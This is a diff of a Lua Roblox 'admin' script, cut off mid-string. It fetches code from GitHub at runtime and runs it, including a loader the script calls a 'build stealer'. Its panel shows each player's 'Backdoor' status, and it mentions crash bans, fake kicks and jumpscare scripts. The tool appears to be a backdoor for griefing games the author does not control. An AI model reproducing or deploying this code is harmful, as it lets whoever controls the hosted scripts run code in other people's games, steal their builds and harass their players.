@@ -1,5 +1,5 @@
 -- copy anything you want from here i dont care --
--- this was all made by cxo --
+-- this was all made by me unless i state otherwise --
 
 --[[
 
@@ -8,16 +8,33 @@
 
 
 	im over here googing my goog i got goog on my goog right now
+
+	add:
+
+	fake kick custom msg
+	real kick custom msg (like ckick in adonis)
+
+	system msg | kinda tarded to do it now, new chat will allow for it way easier
+	esp | useless
+
+	==========================================================
+
+	player1 to player2 chat system
+	
+	==========================================================
 ]]
 
 if _G.cxosadminloaded == true then
-	print("cxo's admin is already running!")
+	warn("cxo's admin is already running!")
 	return
 end
 _G.cxosadminloaded = true
 
+-- dont touch any of these tables or ur gay --
+
+-------------------------------------------- VARIABLES --------------------------------------------
+
 local cxoURL = "https://raw.githubusercontent.com/pcxo/whitelisted/main/users"
-local prefix = "/"
 local cmds = {}
 local banned = {}
 local crashbanned = {}
@@ -26,14 +43,28 @@ local chats = {}
 local TempWhitelist = {}
 local autore = {}
 local fpslooped = {}
+local googul = {}
+local frames = {}
+local gmodded = {}
+local lelnobypassforu = {}
+local anticheatmeasure = {}
+local panelanticheat = {}
+local autodelete = {}
+local configs = {}
+local emojis = {"❓", "⌨️🖱️", "📱", "🎮", "🥽", "🖱️", "⌨️"}
 local locked = false
-local connected
-local connected2
 local guiactive = false
-local banhammered
-local ignorethis
+local iyloaded = nil
+local connected, connected2, banhammered, ignorethis, ignorethistoo, V1, music, nodisco
+
+-----------------------------------------------------------------------------------------------
+
+local prefix = "/"
+local tag = true
 
 -- Thanks roblox for taking down my module every time i upload this script --
+
+-------------------------------------------- SETUP --------------------------------------------
 
 local success, result = pcall(function() -- setup
 	return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/setup")
@@ -46,10 +77,10 @@ if success then
 	if loaded then
 		loaded()
 	else
-		print("Error loading script: " .. fail)
+		warn("Failed to load setup script: " .. fail)
 	end
 else
-	print("Error fetching file: " .. result)
+	warn("Failed to load setup script")
 end
 
 local success, result = pcall(function() -- gmod gun
@@ -63,10 +94,10 @@ if success then
 	if loaded then
 		loaded()
 	else
-		print("Error loading script: " .. fail)
+		warn("Failed to load gmod gun: " .. fail)
 	end
 else
-	print("Error fetching file: " .. result)
+	warn("Failed to load gmod gun.")
 end
 
 local success, result = pcall(function() -- decryptionite's build loader
@@ -79,52 +110,34 @@ if success then
 	if loaded then
 		loaded()
 	else
-		print("Failed to load decryptionite's build stealer / loader.")
+		warn("Failed to load decryptionite's build stealer / loader: ".. fail)
 	end
 else
-	print("Failed to load decryptionite's build stealer / loader")
+	warn("Failed to load decryptionite's build stealer / loader")
 end
 
--- LOCAL REQUIRES --
+local success, result = pcall(function() -- configs loader
+	return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/configs")
+end)
 
---require(139263854632403).load() -- gmod gun script
---require(118393455763822) -- jumpscare script
---require(97248613655645).Run() -- chat script (Credit to palamode)
+print(result)
 
---repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("RemoteScript")
+if success then
+	for UID, cfg in result:gmatch("(%d+):%[%[(.-)%]%]") do
+		local data = {}
+
+		for c in cfg:gmatch('"([^"]+)"') do
+			table.insert(data, c)
+		end
+
+		configs[UID] = data
+	end
+else
+	warn("Failed to load configs")
+end
+
 repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
---repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("JumpScareScript")
 
---game:GetService("ReplicatedStorage").RemoteScript.Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
---[[game:GetService("ReplicatedStorage").JumpScareScript.Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
-
-if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("OrbScript") then
-	local clonedorb = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("OrbScript"):Clone()
-	clonedorb.Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
-else
-	require(126332046537913) -- orb script
-	repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("OrbScript")
-	game:GetService("ReplicatedStorage").OrbScript.Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
-end
-
-if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("Crash") then
-    local clonedcrash = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("Crash"):Clone()
-    clonedcrash.Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
-else
-    require(114690429107613) -- crash script
-    repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("Crash")
-    game:GetService("ReplicatedStorage").Crash.Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
-end
-
-if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("Van") then
-    local clonedvan = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("Van"):Clone()
-    clonedvan.Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
-else
-    require(118862073986037) -- clown van script
-    repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("Van")
-    game:GetService("ReplicatedStorage").Van.Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
-end
-]]
 local success, result = pcall(function()
 	return game:GetService("HttpService"):GetAsync("http://country.io/names.json")
 end)
@@ -223,13 +236,33 @@ local function addcmd(data)
 	}
 end
 
-function gui(plr, section)
-	local plrdevice
+function runcmd(cmdn,message,targets,arguments,extra)
+	local command = cmdn
+	for name, cmd in pairs(cmds) do
+		if table.find(cmd.Data.Aliases, cmdn) then
+			command = name
+			break
+		end
+	end
+	cmds[command].Data.Function(nil,targets,arguments,extra)
+	-- too lazy to remove the message argument entirely
+end
 
-	for i, v in pairs(game.Players:GetPlayers()) do
+function gui(plr, section)
+
+	--[[for i, v in pairs(game.Players:GetPlayers()) do
 		local gather = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("cxo's Device LocalScript"):Clone()
-		gather.Parent = v.Character
-		plrdevice = _G.PlayerDevice(v)
+		if gather then
+			gather.Parent = v.Character
+		end
+	end]]
+
+	if plr.PlayerGui and plr.PlayerGui:FindFirstChild("cxo's admin GUI") then
+		return
+	end
+
+	if not table.find(panelanticheat, plr.UserId) then
+		table.insert(panelanticheat, plr.UserId)
 	end
 
 	-- GUI TO LUA --
@@ -257,6 +290,7 @@ function gui(plr, section)
 
 	ScreenGui.Parent = plr:WaitForChild("PlayerGui")
 	ScreenGui.Name = "cxo's admin GUI"
+	ScreenGui.ResetOnSpawn = false
 
 	Frame.Parent = ScreenGui
 	Frame.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
@@ -342,7 +376,7 @@ function gui(plr, section)
 	SudoButton.Size = UDim2.new(0.33, 0, 1, 0)
 	SudoButton.Position = UDim2.new(0.66, 0, 0, 0)
 	SudoButton.BackgroundTransparency = 1
-	SudoButton.Text = "Sudo Panel"
+	SudoButton.Text = "Panel"
 	SudoButton.TextSize = 20
 	SudoButton.Font = Enum.Font.SourceSansBold
 	SudoButton.TextColor3 = Color3.fromRGB(180, 180, 180)
@@ -371,76 +405,155 @@ function gui(plr, section)
 	layout.Name = "layout"
 
 	local function update()
-		for i, q in pairs(scroll:GetChildren()) do
-			if q:IsA("Frame") then
-				q:Destroy()
+		task.wait(0.15)
+		local frames = {}
+
+		for i, q in pairs(scroll:GetChildren()) do -- inserts their frame into the table so that it doesnt spam it
+			if q:IsA("Frame") and not frames[q.Name] then
+				frames[q.Name] = q
 			end
 		end
 
 		layout.Padding = UDim.new(0, 5)
 
 		for i, player in ipairs(game.Players:GetPlayers()) do
+			local plrframe = frames[player.Name] 
+			if not plrframe then
+				plrframe = Instance.new("Frame")
+				plrframe.Size = UDim2.new(1, 0, 0, 35)
+				plrframe.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+				plrframe.BackgroundTransparency = 0.5
+				plrframe.BorderSizePixel = 0
+				plrframe.Parent = scroll
+				plrframe.Name = player.Name
+			end
 
-			local plrframe = Instance.new("Frame")
-			plrframe.Size = UDim2.new(1, 0, 0, 35)
-			plrframe.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-			plrframe.BackgroundTransparency = 0.5
-			plrframe.BorderSizePixel = 0
-			plrframe.Parent = scroll
-			plrframe.Name = "plrframe"
+			task.spawn(function()
+				getdevice(player)
+			end)
 
-			local headshot = Instance.new("ImageLabel")
-			headshot.Size = UDim2.new(0, 30, 0, 30)
-			headshot.Position = UDim2.new(0, 3.5, 0, 5)
-			headshot.BackgroundTransparency = 1
+			local starttime = tick()
+
+			repeat task.wait() until googul[player.UserId] or not game.Players:FindFirstChild(player.Name) or (tick() - starttime) >= 10
+			-- waits until the players device has been found (or exits if they havent been found in 3 seconds)
+
+			local headshot = plrframe:FindFirstChild("headshot")
+			if not headshot then
+				headshot = Instance.new("ImageLabel")
+				headshot.Size = UDim2.new(0, 30, 0, 30)
+				headshot.Position = UDim2.new(0, 3.5, 0, 5)
+				headshot.BackgroundTransparency = 1
+				headshot.Name = "headshot"
+				headshot.Parent = plrframe
+			end
 			headshot.Image = "rbxthumb://type=AvatarHeadShot&id=" .. player.UserId .. "&w=420&h=420"
-			headshot.Parent = plrframe
-			headshot.Name = "headshot"
 
-			local plrname = Instance.new("TextLabel")
-			plrname.Text = "(".. player.DisplayName ..")\n@" .. player.Name .." ".. plrdevice
-			plrname.Size = UDim2.new(0.6, -5, 1, 0)
-			plrname.Position = UDim2.new(0, 35, 0, 0)
-			plrname.TextColor3 = Color3.fromRGB(255, 255, 255)
-			plrname.BackgroundTransparency = 1
-			plrname.Font = Enum.Font.Gotham
-			plrname.TextSize = 14
-			plrname.TextScaled = false
-			plrname.TextXAlignment = Enum.TextXAlignment.Left
-			plrname.TextYAlignment = Enum.TextYAlignment.Center
-			plrname.Parent = plrframe
-			plrname.Name = "plrname"
+			local plrname = plrframe:FindFirstChild("plrname")
+			if not plrname then
+				plrname = Instance.new("TextLabel")
+				plrname.Size = UDim2.new(0.6, -5, 1, 0)
+				plrname.Position = UDim2.new(0, 35, 0, 0)
+				plrname.TextColor3 = Color3.fromRGB(255, 255, 255)
+				plrname.BackgroundTransparency = 1
+				plrname.Font = Enum.Font.Gotham
+				plrname.TextSize = 14
+				plrname.TextScaled = false
+				plrname.TextXAlignment = Enum.TextXAlignment.Left
+				plrname.TextYAlignment = Enum.TextYAlignment.Center
+				plrname.Name = "plrname"
+				plrname.Parent = plrframe
+			end
 
-			--gather:Destroy()
-
-			local success, code = pcall(game:GetService("LocalizationService").GetCountryRegionForPlayerAsync, game:GetService("LocalizationService"), player)
-
-			local country = Instance.new("TextLabel")
-			country.Size = UDim2.new(0.4, 0, 1, 0)
-			country.Position = UDim2.new(0.6, 0, 0, 0)
-			country.TextColor3 = success and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
-			country.BackgroundTransparency = 1
-			country.Font = Enum.Font.MontserratBold
-			country.TextSize = 14
-			country.TextXAlignment = Enum.TextXAlignment.Right
-			country.TextYAlignment = Enum.TextYAlignment.Center
-			country.Parent = plrframe
-			country.Name = "country"
-
-			if success and code then
-				country.Text = "[ " .. (countries[code] or "UNKNOWN") .. " ]  "
+			if googul[player.UserId] then
+				plrname.Text = "(".. player.DisplayName ..")\n@" .. player.Name .. " ".. googul[player.UserId]
 			else
-				country.Text = "[UNKNOWN]  "
-				country.TextColor3 = Color3.fromRGB(255, 0, 0)
+				plrname.Text = "(".. player.DisplayName ..")\n@" .. player.Name .. " ❓"
+			end
+
+			task.spawn(function()
+				local success, code = pcall(game:GetService("LocalizationService").GetCountryRegionForPlayerAsync, game:GetService("LocalizationService"), player)
+				local country = plrframe:FindFirstChild("country")
+
+				if not country then
+					country = Instance.new("TextLabel")
+					country.Size = UDim2.new(0.4, 0, 1, 0)
+					country.Position = UDim2.new(0.6, 0, 0, 0)
+					country.BackgroundTransparency = 1
+					country.Font = Enum.Font.MontserratBold
+					country.TextSize = 14
+					country.TextXAlignment = Enum.TextXAlignment.Right
+					country.TextYAlignment = Enum.TextYAlignment.Center
+					country.Name = "country"
+					country.Parent = plrframe
+				end
+
+				country.Text = success and "[ " .. countries[code]  .. " ]  " or "[UNKNOWN]  "
+				country.TextColor3 = success and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
+			end)
+
+			frames[player.Name] = nil
+		end
+
+		for i, frame in pairs(frames) do -- stops frames from being blank
+			if not game.Players:FindFirstChild(i) then
+				frame:Destroy()
 			end
 		end
 
+		local seenframes = {}
+
+		for i,v in pairs(scroll:GetChildren()) do -- stops duplicate frames
+			if not table.find(seenframes, v.Name) then
+				table.insert(seenframes, v.Name)
+			else
+				v:Destroy()
+			end
+		end
 		scroll.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y)
 	end
 
-	game.Players.PlayerAdded:Connect(update)
-	game.Players.PlayerRemoving:Connect(update)
-	update()
+	game.Players.PlayerAdded:Connect(function(player)
+
+		repeat task.wait() until player and player.Character or not game.Players:FindFirstChild(player.Name)
+
+		if banned[player.UserId] or crashbanned[player.UserId] then
+			return -- stops frames from appearing then vanishing instantly (waste of resources)
+		end
+
+		if autodelete[player.UserId] then
+			return -- stops frames from appearing then vanishing instantly (waste of resources)
+		end
+
+		if locked == true and not table.find(Whitelist, tostring(player.UserId)) and not table.find(TempWhitelist, player.UserId) then
+			return -- stops frames from appearing then vanishing instantly (waste of resources)
+		end
+
+		if frames[player.Name] then
+			frames[player.Name] = nil -- removes their frame if they already have one
+		end
+
+		task.wait(0.1)
+
+		task.spawn(function()
+			getdevice(player)
+		end)
+
+		local starttime = tick()
+
+		repeat task.wait() until googul[player.UserId] or not game.Players:FindFirstChild(player.Name) or (tick() - starttime) >= 10
+		-- waits until their device is found
+
+		update() 
+	end)
+
+	game.Players.PlayerRemoving:Connect(function(player)
+
+		if googul[player.UserId] then
+			googul[player.UserId] = nil -- removes their frame (incase they rejoin on a different device or something)
+		end
+
+		update()
+	end)
 
 	PlayerList.Parent = ContentFrame
 	PlayerList.Size = UDim2.new(1, 0, 1, 0)
@@ -515,20 +628,368 @@ function gui(plr, section)
 	SudoPanel.Size = UDim2.new(1, 0, 1, 0)
 	SudoPanel.Visible = false
 	SudoPanel.BackgroundTransparency = 1
+	SudoPanel.Name = "PanelFrame"
 
-	local SudoLabel = Instance.new("TextLabel")
-	SudoLabel.Size = UDim2.new(1, 0, 1, 0)
-	SudoLabel.Position = UDim2.new(0, 0, 0, 0)
-	SudoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-	SudoLabel.BackgroundTransparency = 1
-	SudoLabel.Font = Enum.Font.Gotham
-	SudoLabel.TextScaled = true
-	SudoLabel.Text = "i was too lazy to make this Lzz"
-	SudoLabel.Parent = SudoPanel
-	SudoLabel.Name = "SudoLabel"
+	local wld, prem, bd, purm, pee299
+
+	if table.find(Whitelist, tostring(plr.UserId)) or table.find(Whitelist, plr.UserId) then
+		wld = "true"
+	else
+		wld = "false"
+	end
+
+	if plr.MembershipType == Enum.MembershipType.Premium then
+		prem = "true"
+	else
+		prem = "false"
+	end
+
+	if table.find(_G.specialperms, plr.Name) then
+		bd = "true"
+	else
+		bd = "false"
+	end
+
+	if table.find(_G.permadmins, plr.Name) then
+		purm = "true"
+	else
+		purm = "false"
+	end
+
+	if table.find(_G.p299, plr.Name) then
+		pee299 = "true"
+	else
+		pee299 = "false"
+	end
+	
+	local SudoFrame = Instance.new("Frame")
+	local Player_1_TextBox = Instance.new("TextBox")
+	local Player_2_TextBox = Instance.new("TextBox")
+	local Command = Instance.new("TextBox")
+	local Sudo = Instance.new("TextLabel")
+	local Chat_Message = Instance.new("TextBox")
+	local Player_1_Frame = Instance.new("Frame")
+	local UICorner = Instance.new("UICorner")
+	local ImageLabel = Instance.new("ImageLabel")
+	local TextLabel = Instance.new("TextLabel")
+	local UICorner_2 = Instance.new("UICorner")
+	local Player_2_Frame = Instance.new("Frame")
+	local UICorner_3 = Instance.new("UICorner")
+	local ImageLabel_2 = Instance.new("ImageLabel")
+	local TextLabel_2 = Instance.new("TextLabel")
+	local UICorner_4 = Instance.new("UICorner")
+	local Run_Command = Instance.new("TextButton")
+	local Insert_Sudo = Instance.new("TextButton")
+	
+	SudoFrame.Parent = SudoPanel
+	SudoFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	SudoFrame.BackgroundTransparency = 1.000
+	SudoFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	SudoFrame.BorderSizePixel = 0
+	SudoFrame.ClipsDescendants = true
+	SudoFrame.Position = UDim2.new(0, 0, -0.18, 0)
+	SudoFrame.Size = UDim2.new(0, 523, 0, 350)
+	SudoFrame.Name = "Panel_Frame"
+	
+	Player_1_TextBox.Name = "Player_1_TextBox"
+	Player_1_TextBox.Parent = SudoFrame
+	Player_1_TextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	Player_1_TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	Player_1_TextBox.BorderSizePixel = 0
+	Player_1_TextBox.Position = UDim2.new(0.0195227768, 0, 0.738918602, 0)
+	Player_1_TextBox.Size = UDim2.new(0, 208, 0, 25)
+	Player_1_TextBox.Font = Enum.Font.SourceSansBold
+	Player_1_TextBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
+	Player_1_TextBox.PlaceholderText = "Player 1"
+	Player_1_TextBox.Text = ""
+	Player_1_TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Player_1_TextBox.TextSize = 14.000
+	
+	Player_2_TextBox.Name = "Player_2_TextBox"
+	Player_2_TextBox.Parent = SudoFrame
+	Player_2_TextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	Player_2_TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	Player_2_TextBox.BorderSizePixel = 0
+	Player_2_TextBox.Position = UDim2.new(0.578999996, 0, 0.739000022, 0)
+	Player_2_TextBox.Size = UDim2.new(0, 210, 0, 25)
+	Player_2_TextBox.Font = Enum.Font.SourceSansBold
+	Player_2_TextBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
+	Player_2_TextBox.PlaceholderText = "Player 2"
+	Player_2_TextBox.Text = ""
+	Player_2_TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Player_2_TextBox.TextSize = 14.000
+	
+	Command.Name = "Command"
+	Command.Parent = SudoFrame
+	Command.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	Command.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	Command.BorderSizePixel = 0
+	Command.Position = UDim2.new(0.366578072, 0, 0.158687651, 0)
+	Command.Size = UDim2.new(0, 139, 0, 25)
+	Command.Font = Enum.Font.SourceSansBold
+	Command.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
+	Command.PlaceholderText = "Command Name"
+	Command.Text = ""
+	Command.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Command.TextSize = 14.000
+
+	if _G.sudo then
+		Sudo.Name = "Sudo"
+		Sudo.Parent = SudoFrame
+		Sudo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		Sudo.BackgroundTransparency = 1.000
+		Sudo.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		Sudo.BorderSizePixel = 0
+		Sudo.Position = UDim2.new(-0.00100381242, 0, 0.942609191, 0)
+		Sudo.Size = UDim2.new(0, 64, 0, 21)
+		Sudo.Font = Enum.Font.SourceSansBold
+		Sudo.Text = "_G.sudo"
+		Sudo.TextColor3 = Color3.fromRGB(0, 255, 0)
+		Sudo.TextScaled = true
+		Sudo.TextSize = 14.000
+		Sudo.TextWrapped = true
+		Sudo.TextXAlignment = Enum.TextXAlignment.Left
+		Sudo.TextYAlignment = Enum.TextYAlignment.Bottom
+	else
+		Sudo.Name = "Sudo"
+		Sudo.Parent = SudoFrame
+		Sudo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		Sudo.BackgroundTransparency = 1.000
+		Sudo.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		Sudo.BorderSizePixel = 0
+		Sudo.Position = UDim2.new(-0.00100381242, 0, 0.942609191, 0)
+		Sudo.Size = UDim2.new(0, 64, 0, 21)
+		Sudo.Font = Enum.Font.SourceSansBold
+		Sudo.Text = "_G.sudo"
+		Sudo.TextColor3 = Color3.fromRGB(255, 0, 0)
+		Sudo.TextScaled = true
+		Sudo.TextSize = 14.000
+		Sudo.TextWrapped = true
+		Sudo.TextXAlignment = Enum.TextXAlignment.Left
+		Sudo.TextYAlignment = Enum.TextYAlignment.Bottom
+	end
+	
+	Chat_Message.Name = "Chat_Message"
+	Chat_Message.Parent = SudoFrame
+	Chat_Message.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	Chat_Message.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	Chat_Message.BorderSizePixel = 0
+	Chat_Message.Position = UDim2.new(0.306595117, 0, 0.948323429, 0)
+	Chat_Message.Size = UDim2.new(0, 200, 0, 18)
+	Chat_Message.Font = Enum.Font.SourceSansBold
+	Chat_Message.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
+	Chat_Message.PlaceholderText = "Message"
+	Chat_Message.Text = ""
+	Chat_Message.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Chat_Message.TextSize = 14.000
+	
+	Player_1_Frame.Name = "Player_1_Frame"
+	Player_1_Frame.Parent = SudoFrame
+	Player_1_Frame.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
+	Player_1_Frame.BackgroundTransparency = 0.200
+	Player_1_Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	Player_1_Frame.BorderSizePixel = 0
+	Player_1_Frame.ClipsDescendants = true
+	Player_1_Frame.Position = UDim2.new(0.0195227768, 0, 0.369905949, 0)
+	Player_1_Frame.Size = UDim2.new(0, 209, 0, 108)
+	Player_1_Frame.Name = "Player_1_Frame"
+	
+	UICorner.Parent = Player_1_Frame
+	
+	ImageLabel.Parent = Player_1_Frame
+	ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	ImageLabel.BackgroundTransparency = 1.000
+	ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	ImageLabel.BorderSizePixel = 0
+	ImageLabel.Position = UDim2.new(-0.00686017657, 0, 0, 0)
+	ImageLabel.Size = UDim2.new(0, 100, 0, 108)
+	ImageLabel.Image = "rbxthumb://type=Avatar&id=".. plr.UserId .."&w=420&h=420"
+	
+	TextLabel.Parent = ImageLabel
+	TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	TextLabel.BackgroundTransparency = 1.000
+	TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	TextLabel.BorderSizePixel = 0
+	TextLabel.Position = UDim2.new(1.0078088, 0, 0.00679807318, 0)
+	TextLabel.Size = UDim2.new(0, 109, 0, 107)
+	TextLabel.Font = Enum.Font.SourceSansBold
+	TextLabel.Text = "Display: ".. plr.DisplayName .."\nUserId: ".. plr.UserId .."\nAccount Age: ".. plr.AccountAge .."\nWhitelisted: ".. wld .."\nPremium: ".. prem .."\nBackdoor: ".. bd .."\nPerm: ".. purm .."\nP299: ".. pee299
+	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+	TextLabel.TextSize = 13.000
+	TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+	TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+	TextLabel.TextYAlignment = Enum.TextYAlignment.Top
+	
+	UICorner_2.Parent = ImageLabel
+	
+	Player_2_Frame.Name = "Player_2_Frame"
+	Player_2_Frame.Parent = SudoFrame
+	Player_2_Frame.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
+	Player_2_Frame.BackgroundTransparency = 0.200
+	Player_2_Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	Player_2_Frame.BorderSizePixel = 0
+	Player_2_Frame.ClipsDescendants = true
+	Player_2_Frame.Position = UDim2.new(0.579999983, 0, 0.370000005, 0)
+	Player_2_Frame.Size = UDim2.new(0, 209, 0, 108)
+	Player_2_Frame.Name = "Player_2_Frame"
+	
+	UICorner_3.Parent = Player_2_Frame
+	
+	ImageLabel_2.Parent = Player_2_Frame
+	ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	ImageLabel_2.BackgroundTransparency = 1.000
+	ImageLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	ImageLabel_2.BorderSizePixel = 0
+	ImageLabel_2.Position = UDim2.new(-0.00207548728, 0, 0, 0)
+	ImageLabel_2.Size = UDim2.new(0, 100, 0, 108)
+	ImageLabel_2.Image = "rbxthumb://type=Avatar&id=".. plr.UserId .."&w=420&h=420"
+	
+	TextLabel_2.Parent = ImageLabel_2
+	TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	TextLabel_2.BackgroundTransparency = 1.000
+	TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	TextLabel_2.BorderSizePixel = 0
+	TextLabel_2.Position = UDim2.new(1.0078088, 0, -0.00246118614, 0)
+	TextLabel_2.Size = UDim2.new(0, 109, 0, 107)
+	TextLabel_2.Font = Enum.Font.SourceSansBold
+	TextLabel_2.Text = "Display: ".. plr.DisplayName .."\nUserId: ".. plr.UserId .."\nAccount Age: ".. plr.AccountAge .."\nWhitelisted: ".. wld .."\nPremium: ".. prem .."\nBackdoor: ".. bd .."\nPerm: ".. purm .."\nP299: ".. pee299
+	TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+	TextLabel_2.TextSize = 13.000
+	TextLabel_2.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+	TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left
+	TextLabel_2.TextYAlignment = Enum.TextYAlignment.Top
+	
+	UICorner_4.Parent = ImageLabel_2
+	
+	Run_Command.Name = "Run_Command"
+	Run_Command.Parent = SudoFrame
+	Run_Command.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	Run_Command.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	Run_Command.BorderSizePixel = 0
+	Run_Command.Position = UDim2.new(0.42244941, 0, 0.258999974, 0)
+	Run_Command.Size = UDim2.new(0, 80, 0, 20)
+	Run_Command.Font = Enum.Font.SourceSansBold
+	Run_Command.Text = "Run Command"
+	Run_Command.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Run_Command.TextSize = 14.000
+	Run_Command.TextWrapped = true
+
+	if not _G.sudo then
+		Insert_Sudo.Name = "Insert_Sudo"
+		Insert_Sudo.Parent = SudoFrame
+		Insert_Sudo.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		Insert_Sudo.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		Insert_Sudo.BorderSizePixel = 0
+		Insert_Sudo.Position = UDim2.new(0.14783299, 0, 0.948323429, 0)
+		Insert_Sudo.Size = UDim2.new(0, 72, 0, 19)
+		Insert_Sudo.Font = Enum.Font.SourceSansBold
+		Insert_Sudo.Text = "Insert Sudo"
+		Insert_Sudo.TextColor3 = Color3.fromRGB(255, 255, 255)
+		Insert_Sudo.TextSize = 14.000
+		Insert_Sudo.TextWrapped = true
+	end
+
+	local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+	local utilities = game:GetService("ServerScriptService").goog.Utilities
+	local loa = utilities:FindFirstChild("loadstring")
+	
+	if loa then
+		loa = loa:Clone()
+	else
+		loa = utilities:FindFirstChild("Loadstring")
+		if loa then
+			loa = loa:Clone()
+		end
+	end
+	
+	if not loa then
+		warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+	end
+	loa.Parent = scr
+	scr:WaitForChild("Exec").Value = [[
+	
+		local lp = game.Players.LocalPlayer
+		local t1 = lp:WaitForChild("PlayerGui"):FindFirstChild("cxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Player_1_TextBox")
+		local t2 = lp:WaitForChild("PlayerGui"):FindFirstChild("cxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Player_2_TextBox")
+		local t1l = lp:WaitForChild("PlayerGui"):FindFirstChild("cxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Player_1_Frame"):FindFirstChild("ImageLabel"):FindFirstChild("TextLabel")
+		local t2l = lp:WaitForChild("PlayerGui"):FindFirstChild("cxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Player_2_Frame"):FindFirstChild("ImageLabel"):FindFirstChild("TextLabel")
+		local c = lp:WaitForChild("PlayerGui"):FindFirstChild("cxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Command")
